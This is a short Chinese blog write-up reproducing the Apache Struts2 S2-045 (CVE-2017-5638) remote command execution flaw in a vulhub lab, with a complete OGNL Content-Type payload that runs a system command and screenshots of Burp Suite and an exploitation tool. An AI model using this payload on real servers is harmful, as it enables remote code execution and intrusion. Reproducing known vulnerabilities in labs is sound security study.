# CVE-2017-5638 S2-045 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15643950.html`](https://www.cnblogs.com/peace-and-romance/p/15643950.html)

### 0X00-引言

* * *

水文一篇，困了

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

Apache Struts 2 被曝存在远程命令执行漏洞，漏洞编号 S2-045，CVE 编号 CVE-2017-5638，在使用基于 Jakarta 插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。
恶意用户可在上传文件时通过修改 HTTP 请求头中的 Content-Type 值来触发该漏洞，进而执行系统命令。

### 0X03-漏洞复现

* * *

##### 01-任意命令执行

POC：

```
Content-Type:"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" 
```

burpsuite 抓包-repeater-修改

![image-20211205012142318](img/75012fdbb33c1a77396d3a8cd8f8f009.png)

### 0X04-工具利用

* * *

工具地址：[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

##### 01-检测

![image-20211205012352645](img/80643548ee0bfbff9a326071b499b2ef.png)

##### 02-命令执行

![image-20211205012459024](img/3fa8bc50b26987ee6f1f745af8439127.png)

##### 03-文件上传

失败

![image-20211205012641371](img/f11fc1d70f098e52a38bf112e5eab1d3.png)

### 0X05-漏洞分析

* * *

略

### 0X06-查看日志

* * *

未找到 log 文件

### 0X07-参考

* * *

[Struts-S2-045 漏洞利用](https://www.cnblogs.com/zzjdbk/p/13335134.html)